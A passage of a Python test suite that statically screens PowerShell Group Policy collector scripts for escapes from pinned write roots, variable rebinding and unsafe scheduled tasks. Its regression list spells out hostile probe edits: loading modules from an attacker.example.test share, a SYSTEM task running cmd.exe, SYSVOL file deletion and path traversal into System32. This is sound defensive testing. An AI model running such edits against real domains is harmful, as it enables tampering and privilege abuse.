        # is separately pinned (check_pinned_bindings).
        assert norm in pinned_targets, (
            f"{script}:{line}: write target {norm!r} is not a pinned path expression"
        )
        assert not _ABSOLUTE_LITERAL.search(norm), f"{script}:{line}: absolute/UNC/.. in {norm!r}"
        assert not _PROVIDER.search(norm), f"{script}:{line}: provider path in {norm!r}"
        used.add(norm)
    # New-Item must not create links, target a provider, or carry a -Name
    # component (another path segment, Sol BL-4), -Value or -Target path.
    for command in entry["commands"]:
        if command["name"] != "New-Item":
            continue
        bound = command["bound"]
        item_type = _cf(str(bound.get("ItemType", "")))
        assert item_type not in _FORBIDDEN_ITEM_TYPES, (
            f"{script}:{command['line']}: New-Item -ItemType {bound.get('ItemType')} is not allowed"
        )
        assert "PSProvider" not in bound, (
            f"{script}:{command['line']}: New-Item -PSProvider blocked"
        )
        assert "Name" not in bound, (
            f"{script}:{command['line']}: New-Item -Name is a path component and is not allowed"
        )
        for key in ("Value", "Target"):
            value = bound.get(key)
            if isinstance(value, str):
                assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                    f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                )
    _exact("write-target expressions", script, used, pinned_targets)


def check_pinned_bindings(script: str, inv: dict[str, dict[str, Any]]) -> None:
    """Every required variable (write roots, receivers, splats, exec/task inputs,
    and transitively everything their bindings read) is pinned, and each pinned
    variable's complete binding set equals the committed set exactly.

    A binding is any way the variable acquires a value (see the binding-key
    legend above), so a receiver rebind (`$entry = Get-Item <SYSVOL>`, Sol
    round-3 BL-2), a call-site argument to a local function's root parameter
    (`Write-GpoLensOwnerMarkerBytes -OutputRoot <SYSVOL>`), a `[ref]`, a `++`, a
    property/index write on a pinned object, or a variable-writing common
    parameter all change the set and fail.
    """
    pinned = PINNED_VARS[script]
    required = _required_vars(script, inv)
    unpinned = sorted(set(required) - set(pinned))
    assert not unpinned, f"{script}: variables must be pinned: " + "; ".join(
        f"${v} ({required[v]})" for v in unpinned
    )
    bindings = _all_bindings(script, inv)
    for var in sorted(pinned):
        actual = bindings.get(var, set())
        allowed = pinned[var]
        extra = sorted(actual - allowed)
        missing = sorted(allowed - actual)
        assert not extra, (
            f"{script}: ${var} has undocumented binding(s) {extra} "
            "(a confined write/exec/receiver variable cannot be rebound)"
        )
        assert not missing, f"{script}: stale pinned binding(s) for ${var}: {missing}"
        for key in actual:
            if key.startswith("foreach "):
                assert not _ABSOLUTE_LITERAL.search(key) and not _PROVIDER.search(key), (
                    f"{script}: foreach source for pinned ${var} carries an absolute/UNC/provider "
                    f"path: {key!r}"
                )
            elif key.startswith("param "):
                assert not _UNC_OR_DOTDOT.search(key) and not _PROVIDER.search(key), (
                    f"{script}: ${var} parameter default is an unsafe path: {key!r}"
                )
    _, unresolved = _call_site_bindings(script, inv)
    assert not unresolved, f"{script}: call-site arguments that bind no parameter: {unresolved}"


def check_bindings(script: str, entry: dict[str, Any]) -> None:
    """Assignment forms that cannot be pinned, or that rebind the engine.

    Refuses: a provider/drive or `$global:` assignment target (Sol round-3
    `${Alias:Get-Item} = 'Remove-Item'`, `$env:PSModulePath`, `${C:\\x}`); any
    write to an automatic/preference variable outside SPECIAL_BINDINGS; any
    reference to $PSDefaultParameterValues/$PSModuleAutoLoadingPreference/
    $ExecutionContext (DeepSeek NEW-BL-1); an index write outside
    INDEX_ASSIGNMENT_ROOTS; multiple assignment and other unpinnable left-hand
    sides; a drive-qualified variable read other than `$env:`; and a computed or
    unlisted variable-writing common-parameter target (DeepSeek NEW-BL-3).
    """
    others = [a["target"] for a in entry["other_assignments"]]
    assert not others, f"{script}: unpinnable assignment targets: {others}"
    specials: set[tuple[str, str]] = set()
    for binding in entry["variable_assignments"]:
        name = binding["name"]
        where = f"{script}:{binding['line']}"
        assert binding["is_variable"] and binding["qualifier"] in _ALLOWED_QUALIFIERS, (
            f"{where}: ${name} is a provider/drive or global-scope write ({binding['kind']})"
        )
        assert binding["kind"] != "multi", f"{where}: multiple assignment to ${name} is not allowed"
        bare = _bare_var(name)
        if bare == "null" and binding["kind"] == "assign" and binding["operator"] == "Equals":
            continue  # `$null = expr` discards output
        if bare in _SPECIAL_VARIABLES or bare.endswith("preference"):
            specials.add((bare, _binding_key(binding)))
    unexpected = sorted(specials - SPECIAL_BINDINGS[script])
    assert not unexpected, (
        f"{script}: writes to automatic/preference variables are not allowed: {unexpected}"
    )
    _exact("automatic/preference variable writes", script, specials, SPECIAL_BINDINGS[script])
    for ref in entry["variable_refs"]:
        bare = _bare_var(ref["name"])
        assert bare not in FORBIDDEN_VARIABLE_REFS, (
            f"{script}: ${ref['name']} may not be referenced"
        )
        assert ref["drive"] in ("", "env"), (
            f"{script}: provider-qualified variable ${{{ref['name']}}} is not allowed"
        )
    roots = {_cf(i["root_var"] or "") for i in entry["index_assignments"]}
    unexpected_roots = sorted(roots - INDEX_ASSIGNMENT_ROOTS[script])
    assert not unexpected_roots, (
        f"{script}: index writes on {unexpected_roots} are not allowed "
        f"({[i['target'] for i in entry['index_assignments']]})"
    )
    _exact("index-write roots", script, roots, INDEX_ASSIGNMENT_ROOTS[script])
    targets: set[str] = set()
    for write in _common_param_writes(entry):
        assert write["literal"], (
            f"{script}:{write['line']}: -{write['parameter']} target {write['target']!r} must be a "
            "literal variable name (a computed name cannot be pinned)"
        )
        targets.add(_bare_var(write["target"]))
    _exact(
        "variable-writing common-parameter targets", script, targets, COMMON_PARAM_TARGETS[script]
    )


def check_ast(script: str, entry: dict[str, Any]) -> None:
    """Whole-tree screens: every node type serializable and in the closed set;
    no `#Requires` (module auto-import, Sol round-3 BL-1); no background jobs or
    parallel foreach; ASCII source (Windows PowerShell 5.1 reads a BOM-less file
    as ANSI, so non-ASCII bytes could parse differently there than here)."""
    assert not entry["unsupported_nodes"], (
        f"{script}: AST nodes the serializer does not cover: {entry['unsupported_nodes']}"
    )
    extra = sorted(set(entry["node_types"]) - ALLOWED_NODE_TYPES)
    assert not extra, f"{script}: AST node types outside the closed set: {extra}"
    assert not entry["script_requirements"], f"{script}: #Requires is not allowed"
    assert not entry["background_pipelines"], (
        f"{script}: background jobs (`&`) are not allowed: {entry['background_pipelines']}"
    )
    for row in entry["ast_rows"]:
        if row[2] == "ForEachStatementAst":
            flags = dict(row[3]).get("Flags", "None")
            assert flags == "None", f"{script}: foreach -Parallel is not allowed"
    assert entry["source_non_ascii_bytes"] == 0, (
        f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
    )


def check_local_functions(script: str, entry: dict[str, Any]) -> None:
    names = list(entry["functions"])
    assert len(names) == len({_cf(n) for n in names}), f"{script}: a function is defined twice"
    assert tuple(names) == LOCAL_FUNCTIONS[script], (
        f"{script}: defined functions {names} differ from LOCAL_FUNCTIONS "
        f"{list(LOCAL_FUNCTIONS[script])}"
    )


# Operations that write, delete, execute or register: their exact normalized
# text AND control-flow context (enclosing functions, conditions, loops,
# try/catch/finally, scriptblock arguments, and every preceding guard — an `if`
# that throws/returns, an `Assert-*` call, an exit statement) are pinned as a
# multiset. A duplicate outside its guard (Sol round-3 `Unregister-Scheduled-
# Task` copy), a guard moved after the operation (Sol/DeepSeek reorders), or a
# weakened guard condition (Sol `-or` -> `-and`) changes the multiset.
_GUARDED_COMMANDS = frozenset(
    set(_WRITE_COMMANDS) | {"Register-ScheduledTask", "Unregister-ScheduledTask", "Get-GPOReport"}
)
_GUARDED_STATIC = frozenset(
    _WRITE_STATIC | {"IO.Compression.ZipFileExtensions::CreateEntryFromFile"}
)


def _guarded_ops(entry: dict[str, Any]) -> list[tuple[str, tuple[str, ...]]]:
    ops: list[tuple[str, tuple[str, ...]]] = []
    for command in entry["commands"]:
        name = command["name"]
        dynamic = not name or command["invocation"] in ("Ampersand", "Dot")
        if dynamic or name in _GUARDED_COMMANDS:
            ops.append((_norm(command["text"]), tuple(_norm(c) for c in command["context"])))
    for member in entry["members"]:
        if member["static"]:
            if (
                f"{_normalize_type(member['type'] or '')}::{member['member']}"
                not in _GUARDED_STATIC
            ):
                continue
        elif member["member"] not in _SIDE_EFFECTING_METHODS:
            continue
        ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
    return ops


def check_guarded_ops(script: str, entry: dict[str, Any]) -> None:
    from collections import Counter

    actual = Counter(_guarded_ops(entry))
    allowed = Counter(GUARDED_OPS[script])
    extra = actual - allowed
    missing = allowed - actual
    assert not extra and not missing, (
        f"{script}: write/exec operations or their guards changed.\n"
        + "".join(f"  unexpected: {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(extra))
        + "".join(f"  missing:    {op} @ {' > '.join(ctx)}\n" for op, ctx in sorted(missing))
    )


def _arg_vector(command: dict[str, Any]) -> TaskVector:
    return frozenset(
        (str(a["parameter"]), _norm(a["value"]) if a["value"] is not None else None)
        for a in command["arguments"]
        if a["parameter"]
    )


def check_task_action(script: str, entry: dict[str, Any]) -> None:
    if script != _TASK_ACTION_SCRIPT:
        for command in entry["commands"]:
            assert command["name"] not in TASK_ARG_VECTORS, (
                f"{script}:{command['line']}: scheduled-task cmdlet outside the registration script"
            )
        return
    for command in entry["commands"]:
        vectors = TASK_ARG_VECTORS.get(command["name"] or "")
        if vectors is None:
            continue
        # The full argument vector must match one pinned vector exactly. An
        # extra -CimSession, a wildcard -TaskName, -RunLevel Highest, or any
        # other changed/added argument matches none and fails.
        actual = _arg_vector(command)
        assert actual in vectors, (
            f"{script}:{command['line']}: {command['name']} argument vector {sorted(actual)} "
            f"matches no pinned vector"
        )


# Named semantic checks, in run order. Each takes (script, entry); the two that
# also need the local function set are wrapped. The names are what the
# regression suite asserts against (NON-BL-3).
def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {
        "ast": check_ast,
        "commands": lambda s, e: check_commands(s, e, local),
        "local_functions": check_local_functions,
        "dotnet": check_dotnet,
        "types": check_types,
        "instance_receivers": check_instance_receivers,
        "usings": check_usings,
        "redirections": check_redirections,
        "new_object_and_add_type": check_new_object_and_add_type,
        "writes": check_writes,
        "bindings": check_bindings,
        "pinned_bindings": lambda s, e: check_pinned_bindings(s, inv),
        "task_action": check_task_action,
        "guarded_ops": check_guarded_ops,
    }


def _run_checks(script: str, inv: dict[str, dict[str, Any]]) -> set[str]:
    """Run every semantic check; return the set of check names that raised.

    ``parse_errors`` is reported as the pseudo-check ``parse`` so the regression
    suite can require a *substantive* check (not a parse failure) to flag a probe.
    """
    policy = POLICIES[script]
    entry = inv[script]
    local = set(entry["functions"])
    for source in policy.dot_sources:
        local |= set(inv[source]["functions"])
    failed: set[str] = set()
    if entry["parse_errors"]:
        failed.add("parse")
    for check_name, fn in _named_checks(local, inv).items():
        try:
            fn(script, entry)
        except AssertionError:
            failed.add(check_name)
    return failed


def run_all_checks(script: str, inv: dict[str, dict[str, Any]]) -> None:
    entry = inv[script]
    assert entry["parse_errors"] == [], f"{script}: {entry['parse_errors']}"
    failed = {c for c in _run_checks(script, inv) if c != "parse"}
    assert not failed, f"{script}: checks failed: {sorted(failed)}"


# ---------------------------------------------------------------------------
# Closed-world golden inventory. For each in-scope script the committed file
# records (1) ``ast``: a canonical, order-preserving serialization of the WHOLE
# syntax tree — one line per node, pre-order, indented by depth, naming the
# property the node fills in its parent and every semantically relevant scalar
# (operators, names, string values, flags, #Requires, attributes, ...); and
# (2) ``source_sha256``: a digest of the source text with only CRLF->LF
# normalized, so comments and whitespace (which the AST omits but a script can
# observe, e.g. via a scriptblock's text) are covered too. Any change to a
# collector therefore changes the inventory and fails
# test_inventory_matches_golden until it is regenerated by
# scripts/gen_collector_inventory.py, which refuses unless every semantic check
# above passes.
# ---------------------------------------------------------------------------

GOLDEN_PATH = _REPO / "tests" / "powershell" / "collector-inventory.json"


def _ast_line(row: list[Any]) -> str:
    depth, role, kind, attrs = row[0], row[1], row[2], row[3]
    text = "  " * int(depth) + f"{role}: {kind}"
    for key, value in attrs:
        text += f" {key}={json.dumps(value, ensure_ascii=True)}"
    if len(row) > 4:  # an UNSUPPORTED node also carries its source text
        text += f" text={json.dumps(row[4], ensure_ascii=True)}"
    return text


def _canonical(entry: dict[str, Any]) -> dict[str, Any]:
    return {
        "source_sha256": entry["source_sha256"],
        "parse_errors": entry["parse_errors"],
        "ast": [_ast_line(row) for row in entry["ast_rows"]],
    }


def build_full_inventory(inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {script: _canonical(inv[script]) for script in sorted(POLICIES)}


def _dump_golden(golden: dict[str, Any]) -> str:
    return json.dumps(golden, indent=1, sort_keys=True, ensure_ascii=True) + "\n"


def write_golden_inventory(exe: str) -> dict[str, Any]:
    """Build, semantically validate, and write the golden inventory.

    The generator refuses to write unless every semantic check passes for every
    script. That is the regeneration floor: it can only admit what the semantic
    layer admits, and the resulting golden diff is what a reviewer inspects.
    """
    inv = _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])
    for script in POLICIES:
        run_all_checks(script, inv)
    golden = build_full_inventory(inv)
    GOLDEN_PATH.write_text(_dump_golden(golden), encoding="utf-8")
    return golden


def test_inventory_matches_golden(inventory: dict[str, dict[str, Any]]) -> None:
    assert GOLDEN_PATH.exists(), (
        "tests/powershell/collector-inventory.json is missing; "
        "run `python scripts/gen_collector_inventory.py`"
    )
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    current = build_full_inventory(inventory)
    if committed != current:
        import difflib

        diff = "\n".join(
            list(
                difflib.unified_diff(
                    _dump_golden(committed).splitlines(),
                    _dump_golden(current).splitlines(),
                    fromfile="committed",
                    tofile="current",
                    lineterm="",
                )
            )[:120]
        )
        raise AssertionError(
            "collector syntax-tree inventory changed. A reviewer must confirm the diff, then "
            "regenerate with `python scripts/gen_collector_inventory.py`:\n" + diff
        )


# Files PowerShell can load as code or configuration. Every one under scripts/
# must be classified (Sol round-3: a .psm1 was outside the glob).
_POWERSHELL_SUFFIXES = (".ps1", ".psm1", ".psd1", ".ps1xml", ".cdxml", ".pssc", ".psrc")


def _unclassified_scripts(root: Path) -> tuple[list[str], list[str]]:
    on_disk = {
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file() and p.suffix.casefold() in _POWERSHELL_SUFFIXES
    }
    classified = set(POLICIES) | set(OUT_OF_SCOPE)
    return sorted(on_disk - classified), sorted(classified - on_disk)


def test_every_script_is_classified() -> None:
    unclassified, missing = _unclassified_scripts(_SCRIPTS)
    assert not unclassified and not missing, (
        "Every PowerShell file under scripts/ must be in POLICIES or OUT_OF_SCOPE: "
        f"unclassified {unclassified}, missing {missing}"
    )


def test_module_files_need_classification(tmp_path: Path) -> None:
    for name in (*POLICIES, *OUT_OF_SCOPE):
        (tmp_path / name).write_text("", encoding="utf-8")
    (tmp_path / "GpoLensReviewerPayload.psm1").write_text("", encoding="utf-8")
    (tmp_path / "nested").mkdir()
    (tmp_path / "nested" / "Payload.psd1").write_text("@{}", encoding="utf-8")
    unclassified, missing = _unclassified_scripts(tmp_path)
    assert unclassified == ["GpoLensReviewerPayload.psm1", "nested/Payload.psd1"]
    assert missing == []


def test_policy_tables_cover_every_script() -> None:
    for table_name, table in (
        ("WRITE_ROOTS", WRITE_ROOTS),
        ("PINNED_VARS", PINNED_VARS),
        ("INSTANCE_RECEIVERS", INSTANCE_RECEIVERS),
        ("WRITE_TARGET_EXPRESSIONS", WRITE_TARGET_EXPRESSIONS),
        ("SPECIAL_BINDINGS", SPECIAL_BINDINGS),
        ("INDEX_ASSIGNMENT_ROOTS", INDEX_ASSIGNMENT_ROOTS),
        ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
        ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
        ("GUARDED_OPS", GUARDED_OPS),
    ):
        assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"


def test_forbidden_commands_are_never_allowlisted() -> None:
    forbidden = {_cf(c) for c in FORBIDDEN_COMMANDS}
    for script, policy in POLICIES.items():
        hits = sorted(c for c in policy.commands if _cf(c) in forbidden)
        assert not hits, f"{script}: allowlists never-allowed commands {hits}"


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_parses_without_errors(inventory: dict[str, dict[str, Any]], script: str) -> None:
    assert inventory[script]["parse_errors"] == []


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_commands_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    policy = POLICIES[script]
    local = set(inventory[script]["functions"])
    for source in policy.dot_sources:
        local |= set(inventory[source]["functions"])
    check_commands(script, inventory[script], local)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_dotnet_calls_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_dotnet(script, inventory[script])
    check_types(script, inventory[script])
    check_instance_receivers(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_using_or_disallowed_redirection(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_usings(script, inventory[script])
    check_redirections(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_new_object_and_add_type(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_new_object_and_add_type(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_writes_stay_under_declared_roots(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_writes(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_pinned_variables_are_not_rebound(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_pinned_bindings(script, inventory)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_scheduled_task_arguments_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_task_action(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_whole_tree_screens(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_ast(script, inventory[script])
    check_local_functions(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_unpinnable_or_engine_bindings(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_bindings(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_write_and_exec_operations_keep_their_guards(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_guarded_ops(script, inventory[script])


def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
    """Every AD/GroupPolicy noun-verb in an allowlist is a Get-*, and only the
    registration script may name the scheduled-task cmdlets."""
    task_cmdlets = {
        "New-ScheduledTask",
        "New-ScheduledTaskAction",
        "New-ScheduledTaskPrincipal",
        "New-ScheduledTaskSettingsSet",
        "New-ScheduledTaskTrigger",
        "Register-ScheduledTask",
        "Unregister-ScheduledTask",
    }
    for script, policy in POLICIES.items():
        directory = {c for c in policy.commands if re.match(r"^\w+-(AD|GP)", c)}
        assert all(c.startswith("Get-") for c in directory), (script, sorted(directory))
        tasks = policy.commands & task_cmdlets
        if script != _TASK_ACTION_SCRIPT:
            assert not tasks, f"{script} must not touch Task Scheduler: {sorted(tasks)}"


# ---------------------------------------------------------------------------
# Regression suite: every reviewer probe (both lineages) must be flagged. Each
# probe appends/prepends one malicious edit to a copy of a real script; the
# full gate must raise for that script. A clean copy must pass.
# ---------------------------------------------------------------------------

# (id, base script, mode, edit). mode is "append"/"prepend" (edit = snippet),
# "before" (edit = (marker, snippet)) or "replace" (edit = (old, new)); the
# marker/old text must occur exactly once. Snippets are synthetic and use
# example.test / LABDOMAIN placeholders only.
Probe = tuple[str, str, str, str | tuple[str, str]]
_REGRESSIONS: list[Probe] = [
    # --- Sol probes ---
    (
        "sol_root_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "sol_registry_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = 'HKLM:\\Software\\GpoLensGateBypass'\n"
        "New-Item -Path $OutputRoot -Force | Out-Null\n",
    ),
    (
        "sol_set_itemtype",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -ItemType SymbolicLink "
        "-Value '\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Force | Out-Null\n",
    ),
    (
        "sol_redirection",
        "Export-GpoEstate.ps1",
        "append",
        "'owned' > '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_redirection_stream",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'owned' 6> '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_get_gporeport_path",
        "Export-GpoEstate.ps1",
        "append",
        "Get-GPOReport -All -ReportType Xml "
        "-Path '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "sol_instance_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$unownedFile = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$unownedFile.Delete()\n",
    ),
    (
        "sol_adsi_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$domain = [ADSI]'WinNT://LABDOMAIN,domain'\n$domain.Delete('user', 'victim')\n",
    ),
    ("sol_using_module", "Export-GpoEstate.ps1", "prepend", "using module ./GateEvil.psm1\n"),
    (
        "sol_collector_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "$CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "sol_task_abuse",
        "Register-GpoLensCollection.ps1",
        "append",
        "$evilAction = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$evilTask = New-ScheduledTask -Action $evilAction -Principal $principal\n"
        "Register-ScheduledTask -TaskName 'GpoLensGateBypass' -InputObject $evilTask -Force\n",
    ),
    # --- DeepSeek probes ---
    (
        "ds_writeroot_var",
        "Export-GpoEstate.ps1",
        "append",
        "$dest = Join-Path 'C:\\Windows\\System32' 'evil.dll'\n"
        "Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue\n",
    ),
    (
        "ds_writeroot_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$LogPath = 'C:\\Windows\\System32\\evil.log'\n"
        "[IO.File]::AppendAllText($LogPath, 'owned', [Text.UTF8Encoding]::new($false))\n",
    ),
    (
        "ds_adsi_copyto_marker",
        "GpoLensCollectionMarker.ps1",
        "append",
        "([ADSI]'LDAP://CN=victim,OU=x,DC=example,DC=test')"
        ".CopyTo('LDAP://OU=evil,DC=example,DC=test')\n",
    ),
    (
        "ds_register_args",
        "Register-GpoLensCollection.ps1",
        "append",
        "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n"
        "$t = New-ScheduledTask -Action $a -Principal $p\n"
        "Register-ScheduledTask -TaskName 'NotGpoLens' -InputObject $t -Force\n",
    ),
    (
        "ds_using_assembly",
        "Export-GpoEstate.ps1",
        "prepend",
        "using assembly System.DirectoryServices\n",
    ),
    # --- Negative controls from both lineages (must already be rejected) ---
    (
        "neg_set_adobject",
        "Export-GpoEstate.ps1",
        "append",
        "Set-ADObject -Identity 'x' -Replace @{description='y'}\n",
    ),
    (
        "neg_adsi_commit",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$e.CommitChanges()\n",
    ),
    (
        "neg_dynamic_member",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$m = 'CommitChanges'\n$e.$m()\n",
    ),
    ("neg_com", "Export-GpoEstate.ps1", "append", "New-Object -ComObject 'WScript.Shell'\n"),
    (
        "neg_namespace_de",
        "Export-GpoEstate.ps1",
        "prepend",
        "using namespace System.DirectoryServices\n",
    ),
    (
        "neg_splat_write",
        "Export-GpoEstate.ps1",
        "append",
        "$w = @{ LiteralPath = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'; Value = 'owned' }\n"
        "Set-Content @w\n",
    ),
    (
        "neg_addtype_inline",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -TypeDefinition 'public static class P { public static void R() {} }'\n",
    ),
    (
        "neg_import_module_unc",
        "Export-GpoEstate.ps1",
        "append",
        "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
    ),
    # --- Sol round-2 candidates (19), each previously accepted ---
    # BL-1: variable-writing common parameters rebind a pinned variable.
    (
        "r2_outvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable OutputRoot | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_pipelinevariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -PipelineVariable OutputRoot | "
        "ForEach-Object { Set-Content -LiteralPath $OutputRoot -Value 'owned' }\n",
    ),
    (
        "r2_errorvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Error 'C:\\Windows\\Temp\\gate.txt' -ErrorVariable OutputRoot "
        "-ErrorAction SilentlyContinue\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_warningvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Warning 'C:\\Windows\\Temp\\gate.txt' -WarningVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_informationvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'C:\\Windows\\Temp\\gate.txt' -InformationVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_collectorpath_outvariable_override",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\Mutate.ps1' "
        "-OutVariable CollectorPath | Out-Null\n",
    ),
    (
        "r2_taskargs_outvariable_override",
        "Register-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\payload.ps1' "
        "-OutVariable taskArgs | Out-Null\n",
    ),
    # BL-2: receiver-less / parenthesized receivers on side-effecting methods.
    (
        "r2_parenthesized_receiver_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml').Delete()\n",
    ),
    (
        "r2_parenthesized_receiver_open_write",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "Open([IO.FileMode]::Open, [IO.FileAccess]::Write).Write([byte[]](65), 0, 1)\n",
    ),
    (
        "r2_parenthesized_fileinfo_copyto_sysvol",
        "GpoLensCollectionMarker.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "CopyTo('\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\evil.ini', $true)\n",
    ),
    (
        "r2_wmi_remote_instance_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "([WMI]'\\\\server.example.test\\root\\cimv2:Win32_Environment.Name=\"GATE\"').Delete()\n",
    ),
    # BL-3: scheduled-task operation not pinned.
    (
        "r2_taskname_direct_rebind",
        "Register-GpoLensCollection.ps1",
        "append",
        "$TaskName = '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n",
    ),
    (
        "r2_task_unregister_wildcard",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName '*' -Confirm:$false\n",
    ),
    (
        "r2_task_register_remote_cimsession",
        "Register-GpoLensCollection.ps1",
        "append",
        "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
        "-CimSession 'server.example.test' -Force | Out-Null\n",
    ),
    (
        "r2_task_principal_runlevel_highest",
        "Register-GpoLensCollection.ps1",
        "append",
        "$principal = New-ScheduledTaskPrincipal -UserId $account "
        "-LogonType Password -RunLevel Highest\n",
    ),
    # BL-4: pinned root plus unchecked child data.
    (
        "r2_env_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = $env:GPO_LENS_ESCAPE\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = '..\\..\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_computed_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = ([char]46) + ([char]46) + '\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_new_item_name_traversal",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -Name '..\\..\\Windows\\Temp\\gate.txt' "
        "-ItemType File -Force | Out-Null\n",
    ),
    # --- DeepSeek round-2 candidates ---
    # NEW-BL-1: `..` carried in a non-root child variable / other write forms.
    (
        "ds_dotdot_child_var",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\..\\..\\Windows\\System32\\evil.dll'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $sub) -Value 'owned'\n",
    ),
    (
        "ds_interp_child",
        "Export-GpoEstate.ps1",
        "append",
